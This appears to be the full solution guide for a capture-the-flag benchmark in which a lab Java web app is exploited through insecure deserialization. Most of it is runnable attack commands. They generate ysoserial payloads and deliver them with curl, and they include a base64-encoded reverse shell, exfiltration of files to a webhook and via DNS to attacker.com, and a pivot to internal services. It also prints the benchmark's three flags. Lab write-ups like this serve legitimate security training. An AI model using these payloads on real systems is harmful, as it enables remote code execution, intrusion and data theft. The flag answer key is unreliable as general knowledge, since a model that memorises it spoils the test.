# S7BEN-VHARD-004: Testing and Exploitation Guide

This guide provides a complete walkthrough for exploiting the Java deserialization vulnerabilities in this benchmark.

## Prerequisites

### Required Tools

1. **ysoserial** - Java deserialization exploit tool
   ```bash
   # Download ysoserial
   wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

   # Or clone and build from source
   git clone https://github.com/frohoff/ysoserial.git
   cd ysoserial
   mvn clean package -DskipTests
   ```

2. **Java Development Kit (JDK) 8+**
   ```bash
   # Verify Java installation
   java -version
   ```

3. **curl** - For HTTP requests
4. **jq** - For JSON parsing (optional but recommended)
5. **netcat** - For reverse shells (optional)

### Setup Environment

```bash
# Start all services
docker compose up -d

# Wait for services to initialize
sleep 30

# Verify all services are running
docker compose ps

# Expected output:
# deser-webapp     running (healthy)
# deser-internal   running (healthy)
# deser-victim     running (healthy)
```

## Phase 1: Reconnaissance

### Step 1.1: Identify the Application

```bash
# Get application information
curl http://localhost:8080

# Expected response:
# {
#   "application": "Strike7 Enterprise Portal",
#   "version": "1.0.0",
#   "endpoints": [...]
# }
```

### Step 1.2: Discover Serialized Objects

```bash
# Request a sample serialized session
curl http://localhost:8080/api/session
```

**Expected Output:**
```json
{
  "sample_session": "rO0ABXNyACBjb20uc3RyaWtlNy53ZWJhcHAuVXNlclNlc3Npb24AAAAAAAAAA...",
  "note": "This is a serialized UserSession object",
  "hint": "Java serialized objects start with 'rO0AB' in base64"
}
```

**Key Observation:** The base64 string starts with `rO0AB` which is the magic bytes for Java serialized objects (`AC ED 00 05` in hex).

### Step 1.3: Test Login Functionality

```bash
# Login as admin
curl -X POST http://localhost:8080/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' \
  -v

# Save cookies
curl -X POST http://localhost:8080/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' \
  -c cookies.txt
```

**Expected Response:**
```json
{
  "success": true,
  "message": "Login successful",
  "username": "admin",
  "session": "rO0ABXNyACBjb20uc3RyaWtlNy53ZWJhcHAuVXNlclNlc3Npb24...",
  "hint": "Session data is serialized. Check the SESSION cookie!"
}
```

### Step 1.4: Verify Session Cookie

```bash
# View the SESSION cookie
cat cookies.txt

# Use the session cookie
curl http://localhost:8080/profile -b cookies.txt
```

**Expected Profile Response:**
```json
{
  "username": "admin",
  "role": "admin",
  "isAdmin": true
}
```

## Phase 2: Gadget Chain Discovery

### Step 2.1: Identify Vulnerable Libraries

The application uses **Apache Commons Collections 3.1**, which is vulnerable to deserialization attacks.

**Vulnerable Gadget Chains:**
- CommonsCollections1
- CommonsCollections5
- CommonsCollections6

### Step 2.2: Test Deserialization Endpoint

```bash
# Test the /api/process endpoint with benign data
echo "rO0ABXNyACBjb20uc3RyaWtlNy53ZWJhcHAuVXNlclNlc3Npb24AAAAAAAAAA..." > payload.txt

curl -X POST http://localhost:8080/api/process \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$(cat payload.txt)\"}"
```

**Expected Response:**
```json
{
  "success": true,
  "message": "Data processed successfully",
  "type": "com.strike7.webapp.UserSession",
  "hint": "This endpoint deserializes any base64-encoded Java object!"
}
```

## Phase 3: Payload Generation

### Step 3.1: Generate Proof-of-Concept Payload

First, test with a simple command that doesn't require network access:

```bash
# Generate payload that writes to a file
java -jar ysoserial-all.jar CommonsCollections5 'touch /tmp/pwned' | base64 -w 0 > payload.b64

# Or use CommonsCollections6 (alternative gadget chain)
java -jar ysoserial-all.jar CommonsCollections6 'touch /tmp/pwned' | base64 -w 0 > payload.b64
```

### Step 3.2: Generate Flag Extraction Payload

```bash
# Generate payload to read the flag file
java -jar ysoserial-all.jar CommonsCollections5 'cat /app/flag.txt > /tmp/flag.txt' | base64 -w 0 > payload_flag.b64

# Or output flag to a web-accessible location
java -jar ysoserial-all.jar CommonsCollections6 'cp /app/flag.txt /app/data/flag.txt' | base64 -w 0 > payload_flag.b64
```

### Step 3.3: Generate Reverse Shell Payload (Optional)

```bash
# Start listener on your machine
nc -lvnp 4444

# Generate reverse shell payload
# Replace YOUR_IP with your actual IP address
java -jar ysoserial-all.jar CommonsCollections5 \
  'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}' \
  | base64 -w 0 > payload_shell.b64
```

## Phase 4: Remote Code Execution

### Step 4.1: Deliver Malicious Payload

```bash
# Read the base64 payload
PAYLOAD=$(cat payload_flag.b64)

# Send to /api/process endpoint
curl -X POST http://localhost:8080/api/process \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$PAYLOAD\"}"
```

**Expected Response:**
```json
{
  "error": "Deserialization failed",
  "message": "...",
  "hint": "Make sure the data is a base64-encoded Java serialized object"
}
```

**Note:** The error is expected because the payload executes during deserialization but throws an exception. The command still executes!

### Step 4.2: Verify Code Execution

```bash
# Method 1: Check if command executed
docker compose exec web-app ls -la /tmp/

# Look for pwned file or flag.txt

# Method 2: Check if flag was copied
docker compose exec web-app cat /app/data/flag.txt 2>/dev/null
```

### Step 4.3: Extract FLAG 1

```bash
# Method 1: Direct file read via Docker
docker compose exec web-app cat /app/flag.txt

# Method 2: Via crafted payload
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl -X POST http://YOUR_WEBHOOK/flag --data-binary @/app/flag.txt' \
  | base64 -w 0 > exfil.b64

curl -X POST http://localhost:8080/api/process \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$(cat exfil.b64)\"}"
```

**FLAG 1:** `S7BEN{java_deserialize_web_rce_a1b2c3d4e5f6}`

## Phase 5: Lateral Movement

### Step 5.1: Enumerate Internal Network

```bash
# From within the web-app container
docker compose exec web-app sh

# Check network interfaces
ip addr show

# Ping internal services
ping -c 2 internal-api
ping -c 2 victim-app

# Check routing
ip route
```

**Expected Network:**
```
172.25.0.10 - web-app (current)
172.25.0.20 - internal-api
172.25.0.30 - victim-app
```

### Step 5.2: Exploit Internal API

The internal-api service also has a deserialization vulnerability at `/process`.

```bash
# From web-app container or via crafted payload
curl -X POST http://internal-api:8081/process \
  --data-binary @payload.b64

# Or use ysoserial to target internal-api
java -jar ysoserial-all.jar CommonsCollections6 \
  "curl -X POST http://internal-api:8081/process --data 'test'" \
  | base64 -w 0 > internal_payload.b64
```

### Step 5.3: Access Internal API Directly

```bash
# Execute command to read internal-api flag
docker compose exec internal-api cat /opt/api/secret.txt
```

**FLAG 2:** `S7BEN{internal_api_deserialization_g7h8i9j0k1l2}`

### Step 5.4: Access Victim App

```bash
# Generate payload to access victim-app
java -jar ysoserial-all.jar CommonsCollections5 \
  'curl http://victim-app:8082/data/admin_flag.txt' \
  | base64 -w 0 > victim_payload.b64

# Or directly access via Docker
docker compose exec victim-app cat /data/admin_flag.txt
```

**FLAG 3:** `S7BEN{victim_app_full_compromise_m3n4o5p6q7r8}`

## Complete Attack Chain Summary

```
1. Reconnaissance
   └─ Discover serialized objects in HTTP responses
   └─ Identify /api/process deserialization endpoint
   └─ Confirm Java application with Spring Boot

2. Gadget Chain Discovery
   └─ Detect Apache Commons Collections 3.1
   └─ Identify CommonsCollections5/6 gadget chains
   └─ Verify deserialization occurs

3. Payload Crafting
   └─ Use ysoserial to generate malicious payload
   └─ Encode with base64
   └─ Prepare command: cat /app/flag.txt

4. Remote Code Execution
   └─ Send payload to /api/process
   └─ Trigger deserialization
   └─ Execute arbitrary commands
   └─ FLAG 1: S7BEN{java_deserialize_web_rce_a1b2c3d4e5f6}

5. Lateral Movement
   └─ Enumerate internal network (172.25.0.0/16)
   └─ Pivot to internal-api (172.25.0.20)
   └─ FLAG 2: S7BEN{internal_api_deserialization_g7h8i9j0k1l2}
   └─ Access victim-app (172.25.0.30)
   └─ FLAG 3: S7BEN{victim_app_full_compromise_m3n4o5p6q7r8}
```

## Alternative Exploitation Methods

### Method 1: Cookie Injection

```bash
# Generate malicious serialized session
java -jar ysoserial-all.jar CommonsCollections6 'whoami' | base64 -w 0

# Use as SESSION cookie
curl http://localhost:8080/profile \
  -H "Cookie: SESSION=<malicious-payload>"
```

### Method 2: Multiple Gadget Chains

```bash
# Try different ysoserial payloads
java -jar ysoserial-all.jar CommonsCollections1 'id'
java -jar ysoserial-all.jar CommonsCollections5 'id'
java -jar ysoserial-all.jar CommonsCollections6 'id'
java -jar ysoserial-all.jar CommonsCollections7 'id'
```

### Method 3: Exfiltration via DNS

```bash
# Use DNS exfiltration (requires external DNS server)
java -jar ysoserial-all.jar CommonsCollections6 \
  'nslookup $(cat /app/flag.txt | base64).attacker.com' \
  | base64 -w 0
```

## Troubleshooting

### Issue: Payload doesn't execute

**Solution:**
- Verify ysoserial version is compatible
- Try different gadget chains (CommonsCollections1-7)
- Check that base64 encoding is correct (no line breaks)
- Ensure Java version matches (JDK 8 recommended)

### Issue: Cannot access internal services

**Solution:**
- Verify services are running: `docker compose ps`
- Check network configuration: `docker network inspect sben-deser-01_deser-net`
- Ensure containers can ping each other

### Issue: Base64 decoding errors

**Solution:**
```bash
# Remove line breaks from base64
cat payload.b64 | tr -d '\n' > payload_clean.b64

# Use --wrap=0 with base64
java -jar ysoserial-all.jar CommonsCollections6 'id' | base64 --wrap=0
```

## Quick Reference

### Useful Commands

```bash
# Generate basic payload
java -jar ysoserial-all.jar CommonsCollections6 'COMMAND' | base64 -w 0

# Test payload
curl -X POST http://localhost:8080/api/process \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$(java -jar ysoserial-all.jar CommonsCollections6 'id' | base64 -w 0)\"}"

# Check execution
docker compose exec web-app ps aux

# View logs
docker compose logs web-app

# Get all flags quickly
docker compose exec web-app cat /app/flag.txt
docker compose exec internal-api cat /opt/api/secret.txt
docker compose exec victim-app cat /data/admin_flag.txt
```

### Common ysoserial Payloads

```bash
# File operations
java -jar ysoserial-all.jar CommonsCollections6 'cat /app/flag.txt'
java -jar ysoserial-all.jar CommonsCollections6 'ls -la /app'
java -jar ysoserial-all.jar CommonsCollections6 'whoami'

# Network operations
java -jar ysoserial-all.jar CommonsCollections6 'curl http://attacker.com'
java -jar ysoserial-all.jar CommonsCollections6 'wget http://attacker.com/shell.sh'

# Reverse shell (base64 encoded)
java -jar ysoserial-all.jar CommonsCollections6 \
  'bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|bash'
```

## Success Criteria

- [ ] Successfully identify serialized Java objects
- [ ] Detect Apache Commons Collections vulnerability
- [ ] Generate malicious payload with ysoserial
- [ ] Achieve RCE on web-app
- [ ] Extract FLAG 1 from /app/flag.txt
- [ ] Pivot to internal-api service
- [ ] Extract FLAG 2 from /opt/api/secret.txt
- [ ] Access victim-app
- [ ] Extract FLAG 3 from /data/admin_flag.txt

## Time Estimates

- Reconnaissance: 10-15 minutes
- Gadget Chain Discovery: 5-10 minutes
- Payload Generation: 10-20 minutes (if ysoserial needs to be installed)
- RCE and FLAG 1: 10-15 minutes
- Lateral Movement: 15-20 minutes
- FLAG 2 and FLAG 3: 10-15 minutes

**Total:** 60-95 minutes (experienced), 2-3 hours (learning)

## Learning Resources

- **ysoserial Documentation:** https://github.com/frohoff/ysoserial
- **Java Deserialization Attacks:** https://www.youtube.com/watch?v=VviY3O-euVQ
- **OWASP Deserialization Guide:** https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- **Gadget Chain Explanation:** https://blog.orange.tw/2018/03/pwning-adobe-flash-player-using-code.html
